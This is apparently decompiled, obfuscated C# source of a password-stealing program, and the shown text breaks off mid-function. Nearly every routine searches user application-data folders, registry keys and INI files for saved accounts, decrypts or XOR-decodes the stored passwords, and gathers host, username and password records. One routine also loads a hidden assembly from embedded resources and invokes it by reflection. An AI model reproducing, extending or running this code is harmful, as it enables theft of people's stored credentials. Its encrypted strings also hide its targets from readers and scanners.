using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;

internal sealed class AEM
{
	public class ZP : Dictionary<string, Dictionary<string, string>>
	{
		public void Load(string filename)
		{
			string key = string.Empty;
			checked
			{
				using (StreamReader streamReader = new StreamReader(filename))
				{
					while (!streamReader.EndOfStream)
					{
						string text = streamReader.ReadLine();
						if (text.StartsWith(O.I("HSAFtT9tU/CJXqTiQiKtDw==")) && text.EndsWith(O.I("Z4jD7DD9AWsia64BAagzdA==")))
						{
							key = text.Substring(1, text.Length - 2);
							if (!ContainsKey(key))
							{
								Add(key, new Dictionary<string, string>());
							}
						}
						else if (!text.StartsWith(O.I("09n8N3Pl6ckrpjlAg7i+hA==")) && text.Contains(O.I("gc1Gc6FF0ohA75tz34XTMw==")))
						{
							int num = text.IndexOf('=');
							this[key][text.Substring(0, num)] = text.Substring(num + 1, text.Length - num - 1);
						}
					}
				}
			}
		}
	}

	private static readonly byte[] HW_116 = new byte[24]
	{
		225,
		240,
		195,
		210,
		165,
		180,
		135,
		150,
		105,
		120,
		75,
		90,
		45,
		60,
		15,
		30,
		52,
		18,
		120,
		86,
		171,
		144,
		239,
		205
	};

	private static readonly byte[] PEA_117 = new byte[8]
	{
		52,
		18,
		120,
		86,
		171,
		144,
		239,
		205
	};

	private const string VTZ_118 = "+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

	private static byte[] SP_119 = new byte[11]
	{
		131,
		125,
		252,
		15,
		142,
		179,
		232,
		105,
		115,
		175,
		255
	};

	internal static List<JK> JHE()
	{
		//Discarded unreachable code: IL_00c6, IL_00d9
		//IL_00d0: Expected O, but got I4
		//IL_00d1: Expected O, but got I4
		List<string> list = new List<string>();
		List<JK> list2 = new List<JK>();
		try
		{
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + O.I("swsssXJQPwpBZ7ZjcY9lTJYx6laKzsGV2anwwRZKyVo="));
			foreach (string text in directories)
			{
				if ((text.Contains(O.I("um7v20OaGIK8dIQkFUklcA==")) | text.EndsWith(O.I("oZnP76oC1ZS4jaPK0QwXwA=="))) && File.Exists(text + O.I("jw+ZQahqrPV+Nu07/71YHA==")))
				{
					list2.AddRange(SRT.VQ(text + O.I("jw+ZQahqrPV+Nu07/71YHA=="), O.I("q1KtfWsMwUNGQbagNnayqg=="), O.I("a8GP8b8cAjyx6syZvoL+Pg==")));
				}
			}
			return list2;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> NJG()
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		//IL_0053: Expected O, but got I4
		try
		{
			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), O.I("6FFqljhUZBTj+0fr8b1GPCcgWm1gKBK7ijX3+X0uJCWUlDsr1aRMLP05CWvwmgGD")), O.I("bX8DXkbdfwO/v8/bUIql/Q=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> BIH()
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		//IL_0053: Expected O, but got I4
		try
		{
			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("KyYdSBI36ZKxH3VBnTfpwUPZomGy2ElAgy9DgfszK81bxMAkGRcqrcCDgfDwUfG0eZCKrHX/RXQAZ98NwVAwNw==")), O.I("khxAIKZ/oAHEIylZ9vNcbQ=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> XF()
	{
		//Discarded unreachable code: IL_0193, IL_01a6
		//IL_019d: Expected O, but got I4
		//IL_019e: Expected O, but got I4
		List<JK> list = new List<JK>();
		string empty = string.Empty;
		string empty2 = string.Empty;
		string empty3 = string.Empty;
		checked
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(NXF.GVW(O.I("6cIyLhoNRFyEV0Nw9ALDIA==")));
				if (File.Exists(Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw==")))))
				{
					NXF.TF(Conversions.ToString(objectValue));
					string input = File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw=="))));
					Regex regex = new Regex(O.I("F3JACmraHUgJBF+dyIdXns5PrKEb2PxQhomrxEzRGxlE+uWSgmKlylGKLKJcItiR+6+VXm2MUgMNQTfVGriJjQ=="));
					MatchCollection matchCollection = regex.Matches(input);
					int num = matchCollection.Count - 1;
					for (int i = 0; i <= num; i += 3)
					{
						empty = matchCollection[i].Groups[2].Value;
						empty2 = matchCollection[i + 1].Groups[2].Value;
						empty3 = matchCollection[i + 2].Groups[2].Value;
						if (!string.IsNullOrEmpty(empty) && !string.IsNullOrEmpty(empty2) && empty3 != null)
						{
							JK jK = new JK();
							jK.WE_114 = empty;
							jK.ECS_112 = Conversions.ToString(NXF.QC(empty2));
							jK.GA_113 = Conversions.ToString(NXF.QC(empty3));
							jK.NP_115 = O.I("YJZ2doDG2ISuEzTgGyregA==");
							list.Add(jK);
						}
					}
					NXF.KC();
					return list;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				NXF.KC();
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
			return null;
		}
	}

	internal static List<JK> DNC()
	{
		//Discarded unreachable code: IL_0164, IL_017f, IL_0192
		//IL_0189: Expected O, but got I4
		//IL_018a: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			ResourceManager resourceManager = new ResourceManager(O.I("b6bjqUFf4E50olRITPLS4w=="), Assembly.GetExecutingAssembly());
			byte[] rawAssembly = (byte[])resourceManager.GetObject(O.I("b6bjqUFf4E50olRITPLS4w=="));
			Assembly assembly = Assembly.Load(rawAssembly);
			Type type = assembly.GetType(O.I("YU5peex4DapddWFfhfcsQtOlqH1hgpkRzb1Dzb3tRUQ="));
			MethodInfo method = type.GetMethod(O.I("tLB0k5ecoBa2pjPb7pcyssA34db7h0T6pkVflyelhEw="));
			object objectValue = RuntimeHelpers.GetObjectValue(method.Invoke(method, new object[0]));
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)objectValue).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
					JK jK = new JK();
					jK.WE_114 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, O.I("hMYHoskCVl7ojMO934yKlg=="), new object[0], null, null, null));
					jK.ECS_112 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, O.I("7yxTuFw2mR1rvhoc/nix/A=="), new object[0], null, null, null));
					jK.GA_113 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, O.I("zC6rDcYSQtGl61RYawCHyg=="), new object[0], null, null, null));
					jK.NP_115 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, null, O.I("0yBYMOk2pcR3PepHwYG8cg=="), new object[0], null, null, null));
					list.Add(jK);
				}
				return list;
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> QHE()
	{
		//Discarded unreachable code: IL_006c, IL_007f
		//IL_0076: Expected O, but got I4
		//IL_0077: Expected O, but got I4
		try
		{
			string vOJ_ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + O.I("xmJSj1Z+SeMpnIdx7RgBGqWxpUxemXeddEexVmmh2ht2/rmW5IUWhiW3ZgwHv+LeICS0ZUhznVN5FuYuLQrWBg==");
			string fR_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("rLhjKhuFtwgn9eW1X+iz5N69qhmo2biFPdqPo5bpsVtasczSoE1ynUse3qeFRSHz");
			string UXJ_ = null;
			if (!AQS.EE_(vOJ_, fR_, ref UXJ_))
			{
				return null;
			}
			return AQS.LQ(UXJ_.Remove(checked(UXJ_.Length - 2)));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> HAF()
	{
		//Discarded unreachable code: IL_0193, IL_01a6
		//IL_019d: Expected O, but got I4
		//IL_019e: Expected O, but got I4
		List<JK> list = new List<JK>();
		string empty = string.Empty;
		string empty2 = string.Empty;
		string empty3 = string.Empty;
		checked
		{
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(NXF.GVW(O.I("6IxD9VMHlLlkNbeqNg4Fhw==")));
				if (File.Exists(Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw==")))))
				{
					NXF.TF(Conversions.ToString(objectValue));
					string input = File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw=="))));
					Regex regex = new Regex(O.I("F3JACmraHUgJBF+dyIdXns5PrKEb2PxQhomrxEzRGxlE+uWSgmKlylGKLKJcItiR+6+VXm2MUgMNQTfVGriJjQ=="));
					MatchCollection matchCollection = regex.Matches(input);
					int num = matchCollection.Count - 1;
					for (int i = 0; i <= num; i += 3)
					{
						empty = matchCollection[i].Groups[2].Value;
						empty2 = matchCollection[i + 1].Groups[2].Value;
						empty3 = matchCollection[i + 2].Groups[2].Value;
						if (!string.IsNullOrEmpty(empty) && !string.IsNullOrEmpty(empty2) && empty3 != null)
						{
							JK jK = new JK();
							jK.WE_114 = empty;
							jK.ECS_112 = Conversions.ToString(NXF.QC(empty2));
							jK.GA_113 = Conversions.ToString(NXF.QC(empty3));
							jK.NP_115 = O.I("q6s4YTGX+KjXVNoeXJzpBw==");
							list.Add(jK);
						}
					}
					NXF.KC();
					return list;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				NXF.KC();
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
			return null;
		}
	}

	internal static List<JK> LA()
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		//IL_0053: Expected O, but got I4
		try
		{
			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("p0PDzqn/xONUMUGbTdKlaBl8XgJAq1rWzoU4X7GuEl+sKjK9girJNQi+hVX/H+8Z")), O.I("qlBjkGvEULl8lINzUClG0Q=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> HYM()
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		//IL_0053: Expected O, but got I4
		try
		{
			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("BpFuGpNCzoZoJk3EqhV7wlE1pSsi2MhL6wgyHrBk6YBZyrO0j3vlHkvkFp8aB5ZsEt0HDSksxvIy1eEr3M8dkA==")), O.I("Blb1NNR0/Hvcsz5eCogilQ=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> EMB()
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		//IL_0053: Expected O, but got I4
		try
		{
			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("h7fKkTgFIlGpuVxm2tbEgtpyTIa8bMLkRo4PabCBjUT5GHAqY4z/JbMJSbmeZpfb")), O.I("3rZkqDFZNDnBBXF58Q+wrA=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> RD()
	{
		//Discarded unreachable code: IL_0048, IL_005b
		//IL_0052: Expected O, but got I4
		//IL_0053: Expected O, but got I4
		try
		{
			return SRT.VQ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("uBy3Bw3tIZH3NViXwsIrrQyxRGeqjvlrRh6ygrsxTvoH9vQF4v7E4kCZN1AxFb08")), O.I("B56GQCYZyu+WfamNjwHgLQ=="), O.I("a8GP8b8cAjyx6syZvoL+Pg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> FV()
	{
		//Discarded unreachable code: IL_00aa, IL_00bd
		//IL_00b4: Expected O, but got I4
		//IL_00b5: Expected O, but got I4
		try
		{
			object value = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), O.I("APKufm5xsGmjdmmigwaFhw=="));
			string kWS_ = "";
			string[] files = Directory.GetFiles(Conversions.ToString(value), O.I("1BytCgZ4vZf09FCjk7IViw=="), SearchOption.AllDirectories);
			foreach (string text in files)
			{
				if (text.Contains(O.I("A7OTfgqb7WQXEcH2rsAkcQ==")) && !text.EndsWith(O.I("zuI1RdMh7nT3NZr4+1cv5g==")))
				{
					kWS_ = text;
					break;
				}
			}
			return SRT.VQ(kWS_, O.I("4+K9QWjj+BVHoUrEp1T/cg=="), O.I("wulWPYULNTDM8PZxWjITFg=="));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, EntryPoint = "GetPrivateProfileString", SetLastError = true)]
	private static extern int PXC([MarshalAs(UnmanagedType.VBByRefStr)] ref string _UH_234, [MarshalAs(UnmanagedType.VBByRefStr)] ref string FXA_235, [MarshalAs(UnmanagedType.VBByRefStr)] ref string RYJ_236, StringBuilder CGN_237, int LQS_238, [MarshalAs(UnmanagedType.VBByRefStr)] ref string NGX_239);

	internal static JK PCK()
	{
		//Discarded unreachable code: IL_0138, IL_014b
		//IL_0142: Expected O, but got I4
		//IL_0143: Expected O, but got I4
		JK jK = new JK();
		try
		{
			string text = Conversions.ToString(W.F_4.Registry.GetValue(O.I("kwTbWGPthx54z7ItP6ZZgLDuaSwQAOUPhZKQ/ajEZdBgsym0iO2NFSfrdD0nzJR2ZKuZqj/8seRhbmxhmFyNCQ=="), O.I("J7VlJCCG7Db/fvIMEGIvpw=="), null));
			string[] array = text.Split(' ');
			string NGX_ = array[2];
			StringBuilder stringBuilder = new StringBuilder(500);
			string _UH_ = O.I("JSM753HtHlM8a1MMjU1Wgg==");
			string FXA_ = O.I("lY4RWFpX9AJUkIdTAszLqdv6t4Rb9w4Qpf7WNHzxD+M=");
			string RYJ_ = "";
			int num = PXC(ref _UH_, ref FXA_, ref RYJ_, stringBuilder, stringBuilder.Capacity, ref NGX_);
			StringBuilder stringBuilder2 = new StringBuilder(500);
			RYJ_ = O.I("JSM753HtHlM8a1MMjU1Wgg==");
			FXA_ = O.I("bQuHoFE+tYGhqfyEfwggNA==");
			_UH_ = "";
			int num2 = PXC(ref RYJ_, ref FXA_, ref _UH_, stringBuilder2, stringBuilder2.Capacity, ref NGX_);
			jK.WE_114 = O.I("q542gy/+wDIUJhH3OGKnNg==");
			jK.ECS_112 = stringBuilder2.ToString();
			jK.GA_113 = Encoding.UTF8.GetString(Convert.FromBase64String(stringBuilder.ToString()));
			jK.NP_115 = O.I("mptnBr6Tvu+2FIt7PDgXSA==");
			return jK;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			JK result = new JK();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	internal static List<JK> FU()
	{
		//Discarded unreachable code: IL_0303, IL_0316
		//IL_030d: Expected O, but got I4
		//IL_030e: Expected O, but got I4
		string empty = string.Empty;
		string empty2 = string.Empty;
		string empty3 = string.Empty;
		object objectValue = RuntimeHelpers.GetObjectValue(NXF.GVW(O.I("tmJj5XnYT7IpBWqbz+s17A==")));
		string text = Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("BlJIsuAfiM2P2pxW4LPVoQ==")));
		string path = Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw==")));
		List<JK> list = new List<JK>();
		checked
		{
			if (File.Exists(text))
			{
				try
				{
					if (File.Exists(text))
					{
						NXF.TF(Conversions.ToString(objectValue));
						AZI aZI;
						try
						{
							aZI = new AZI(text);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							ProjectData.ClearProjectError();
							goto IL_01a2;
						}
						if (aZI.JIG(O.I("6+YOiJjJFuXoc5ghl+hW1w==")))
						{
							int num = aZI.KW() - 1;
							for (int i = 0; i <= num; i++)
							{
								try
								{
									empty = aZI.UTA(i, O.I("mui3rETbk+Jt+Ci4dJ8Lqw=="));
									empty2 = aZI.UTA(i, O.I("xVJXWZWqIh5mIrFdAKvC+bHR3aXZm/DLS+z8rpSodSs="));
									empty3 = aZI.UTA(i, O.I("CWU1/X9QUt8ANcHmbViwWvbZX4+jO91nDZHrpMcbYVs="));
									if (!string.IsNullOrEmpty(empty) && !string.IsNullOrEmpty(empty2) && empty3 != null)
									{
										JK jK = new JK();
										jK.WE_114 = empty;
										jK.ECS_112 = Conversions.ToString(NXF.QC(empty2));
										jK.GA_113 = Conversions.ToString(NXF.QC(empty3));
										jK.NP_115 = O.I("Pq7mBoKV+ML7QybSk2lHqA==");
										list.Add(jK);
									}
								}
								catch (Exception ex3)
								{
									ProjectData.SetProjectError(ex3);
									Exception ex4 = ex3;
									ProjectData.ClearProjectError();
								}
							}
							NXF.KC();
						}
					}
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					NXF.KC();
					ProjectData.ClearProjectError();
				}
			}
			goto IL_01a2;
		}
		IL_01a2:
		checked
		{
			if (File.Exists(path))
			{
				try
				{
					if (File.Exists(Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw==")))))
					{
						NXF.TF(Conversions.ToString(objectValue));
						string input = File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("6VVUjr8xhgFRi7R9nDwViw=="))));
						Regex regex = new Regex(O.I("F3JACmraHUgJBF+dyIdXns5PrKEb2PxQhomrxEzRGxlE+uWSgmKlylGKLKJcItiR+6+VXm2MUgMNQTfVGriJjQ=="));
						MatchCollection matchCollection = regex.Matches(input);
						int num2 = matchCollection.Count - 1;
						for (int j = 0; j <= num2; j += 3)
						{
							empty = matchCollection[j].Groups[2].Value;
							empty2 = matchCollection[j + 1].Groups[2].Value;
							empty3 = matchCollection[j + 2].Groups[2].Value;
							JK jK2 = new JK();
							jK2.WE_114 = empty;
							jK2.ECS_112 = Conversions.ToString(NXF.QC(empty2));
							jK2.GA_113 = Conversions.ToString(NXF.QC(empty3));
							jK2.NP_115 = O.I("Pq7mBoKV+ML7QybSk2lHqA==");
							list.Add(jK2);
						}
						NXF.KC();
						return list;
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception ex8 = ex7;
					NXF.KC();
					List<JK> result = new List<JK>();
					ProjectData.ClearProjectError();
					return result;
				}
			}
			return new List<JK>();
		}
	}

	internal static List<JK> GJ()
	{
		//Discarded unreachable code: IL_018c, IL_019f
		//IL_0196: Expected O, but got I4
		//IL_0197: Expected O, but got I4
		string empty = string.Empty;
		string empty2 = string.Empty;
		string empty3 = string.Empty;
		object objectValue = RuntimeHelpers.GetObjectValue(NXF.GVW(O.I("3OumPHec2+0VtVVli6gLcQ==")));
		string text = Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("BlJIsuAfiM2P2pxW4LPVoQ==")));
		List<JK> list = new List<JK>();
		checked
		{
			try
			{
				if (!File.Exists(text))
				{
					return list;
				}
				NXF.TF(Conversions.ToString(objectValue));
				AZI aZI;
				try
				{
					aZI = new AZI(text);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					List<JK> result = list;
					ProjectData.ClearProjectError();
					return result;
				}
				if (!aZI.JIG(O.I("6+YOiJjJFuXoc5ghl+hW1w==")))
				{
					return list;
				}
				int num = aZI.KW() - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						empty = aZI.UTA(i, O.I("mui3rETbk+Jt+Ci4dJ8Lqw=="));
						empty2 = aZI.UTA(i, O.I("xVJXWZWqIh5mIrFdAKvC+bHR3aXZm/DLS+z8rpSodSs="));
						empty3 = aZI.UTA(i, O.I("CWU1/X9QUt8ANcHmbViwWvbZX4+jO91nDZHrpMcbYVs="));
						if (!string.IsNullOrEmpty(empty) && !string.IsNullOrEmpty(empty2) && empty3 != null)
						{
							JK jK = new JK();
							jK.WE_114 = empty;
							jK.ECS_112 = Conversions.ToString(NXF.QC(empty2));
							jK.GA_113 = Conversions.ToString(NXF.QC(empty3));
							jK.NP_115 = O.I("mw+T1Bn8iI94BAbLwlQ6hw==");
							list.Add(jK);
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
				}
				NXF.KC();
				return list;
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				List<JK> result = list;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static List<JK> PQL()
	{
		//Discarded unreachable code: IL_014f, IL_0162
		//IL_0159: Expected O, but got I4
		//IL_015a: Expected O, but got I4
		List<JK> list = new List<JK>();
		string empty = string.Empty;
		string empty2 = string.Empty;
		string empty3 = string.Empty;
		object objectValue = RuntimeHelpers.GetObjectValue(NXF.GVW(O.I("kq06D1NC9i9UgDtwJM3oTw==")));
		string path = Conversions.ToString(Operators.ConcatenateObject(objectValue, O.I("aaCUxb2tBaokqI+5gOEZqA==")));
		checked
		{
			try
			{
				NXF.TF(Conversions.ToString(objectValue));
				string text = File.ReadAllText(path);
				int count = Regex.Matches(text, Regex.Escape(O.I("VJv/epFRWD3LlccH3BbX4w=="))).Count;
				int num = count - 1;
				for (int i = 0; i <= num; i++)
				{
					string[] array = AR(text, O.I("rJX1oiTBNze70vTvwbsp2Q=="), O.I("VJv/epFRWD3LlccH3BbX4w=="), i).Split('\r');
					empty = array[0];
					empty2 = array[1];
					empty3 = Conversions.ToString(NXF.QC(array[4]));
					if (!string.IsNullOrEmpty(empty2) && empty3 != null)
					{
						JK jK = new JK();
						jK.WE_114 = empty;
						jK.ECS_112 = empty2;
						jK.GA_113 = empty3;
						jK.NP_115 = O.I("f52RjGKJS5lo54cPE8cSRg==");
						list.Add(jK);
					}
				}
				NXF.KC();
				return list;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				NXF.KC();
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static List<JK> LIB()
	{
		//Discarded unreachable code: IL_0231, IL_0244
		//IL_023b: Expected O, but got I4
		//IL_023c: Expected O, but got I4
		List<JK> list = new List<JK>();
		checked
		{
			try
			{
				object left = Strings.Replace(Interaction.Environ(O.I("sTlEGKpryWi/HyaRDBRbSg==")) + O.I("FtO3o9x/w+Ole8I84aAzLw=="), O.I("h9mSVVoPVbfeKda+pn44CA=="), O.I("FtO3o9x/w+Ole8I84aAzLw=="));
				object value = Operators.ConcatenateObject(left, O.I("UppqDljkvOirn2L6QnyhyiwJLJSYnCsvA3lFnxPfrHA="));
				if (File.Exists(Conversions.ToString(value)))
				{
					Array array = File.ReadAllLines(Conversions.ToString(value));
					IEnumerator enumerator = default(IEnumerator);
					try
					{
						enumerator = array.GetEnumerator();
						string text2 = default(string);
						string sDest = default(string);
						int num3 = default(int);
						while (true)
						{
							if (enumerator.MoveNext())
							{
								string text = Conversions.ToString(enumerator.Current);
								if (Strings.InStr(text.ToLower(), O.I("GuFIang5c/Ghr1Jyx1MiGw==")) > 0)
								{
									text2 = Strings.Split(text, O.I("gc1Gc6FF0ohA75tz34XTMw=="))[1];
								}
								if (Strings.InStr(text.ToLower(), O.I("an0dqOjkYHwfgDhD/zhd3w==")) > 0)
								{
									string text3 = Strings.Split(text, O.I("gc1Gc6FF0ohA75tz34XTMw=="))[1];
									int num = Strings.Len(text3);
									for (int i = 1; i <= num; i += 2)
									{
										sDest += Conversions.ToString(Strings.Chr((int)Math.Round(Conversion.Val(O.I("mJsSWcDqDy3MlAysop6B+g==") + Strings.Mid(text3, i, 2)))));
									}
									int num2 = Strings.Len(sDest);
									for (int j = 1; j <= num2; j++)
									{
										StringType.MidStmtStr(ref sDest, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(sDest, j, 1)) ^ Strings.Asc(Strings.Mid(O.I("AYJjFmZcW4a3W3unjj8u2A=="), num3 + 1, 1)))));
										unchecked
										{
											num3 = checked(num3 + 1) % 8;
										}
									}
									if (text2.Length == 0)
									{
										break;
									}
									JK jK = new JK();
									jK.WE_114 = O.I("rOcrO4oTBNMDFGVtJNh1s6Dcz07vBcXmxvSG2kN+1CA=");
									jK.ECS_112 = text2;
									jK.GA_113 = sDest;
									jK.NP_115 = O.I("DwYVQjHJlQlgRmBomYvuXQ==");
									list.Add(jK);
								}
								continue;
							}
							return list;
						}
						List<JK> result = default(List<JK>);
						return result;
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				List<JK> result = new List<JK>();
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	internal static List<JK> UCO()
	{
		//Discarded unreachable code: IL_0246, IL_0259
		//IL_0250: Expected O, but got I4
		//IL_0251: Expected O, but got I4
		List<JK> list = new List<JK>();
		try
		{
			string[] array = Strings.Split(File.ReadAllText(Interaction.Environ(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("Hms0sFlSgNOOUdQZtn3pXbkpMOzPPRSihDObeM3KPB4=")), O.I("hIpAeeWKB0AHYduhC1Ja0w=="));
			if (array == null)
			{
				return null;
			}
			string[] array2 = array;
			IEnumerator enumerator = default(IEnumerator);
			foreach (string expression in array2)
			{
				object obj = Strings.Split(expression, O.I("DPidYWtSqCMwGKLiwQEQPw=="));
				try
				{
					enumerator = ((IEnumerable)obj).GetEnumerator();
					while (enumerator.MoveNext())
					{
						string text = Conversions.ToString(enumerator.Current);
						JK jK = new JK();
						if (text.Contains(O.I("eSLzT5bWAI4pepHHS3aL3w==")))
						{
							jK.WE_114 = Strings.Split(Strings.Split(text, O.I("eSLzT5bWAI4pepHHS3aL3w=="))[1], O.I("jcRK2xC2ickW2RbMCKOuiA=="))[0] + O.I("Zul69qgSPOrMMuGqrF6sew==") + Strings.Split(Strings.Split(text, O.I("oBts3CYgATcO/RL+AbBpmQ=="))[1], O.I("fvEKWhyB2AJ/kqVyJxjn/A=="))[0];
						}
						if (text.Contains(O.I("Gy5Z2MmkKPmp/IyFwu5LEA==")))
						{
							jK.ECS_112 = Strings.Split(Strings.Split(text, O.I("Gy5Z2MmkKPmp/IyFwu5LEA=="))[1], O.I("vKmf71976sGkcCs1+gTgOA=="))[0];
						}
						if (text.Contains(O.I("YGib+OsbRvVmHiEVFVk4TwovECtpsmh0/f+qLQIGfng=")))
						{
							jK.GA_113 = Conversions.ToString(KHR(Strings.Split(Strings.Split(text, O.I("YGib+OsbRvVmHiEVFVk4TwovECtpsmh0/f+qLQIGfng="))[1], O.I("q+1UXFGkUE2p3etUc40k0Q=="))[0]));
						}
						else if (text.Contains(O.I("kh2xf2IXhh44zV3FDSMjwA==")))
						{
							jK.GA_113 = Strings.Split(Strings.Split(text, O.I("kh2xf2IXhh44zV3FDSMjwA=="))[1], O.I("q+1UXFGkUE2p3etUc40k0Q=="))[0];
						}
						jK.NP_115 = O.I("XKOGjHl1v1fOHa86EhTGVw==");
						list.Add(jK);
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			return list;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			List<JK> result = new List<JK>();
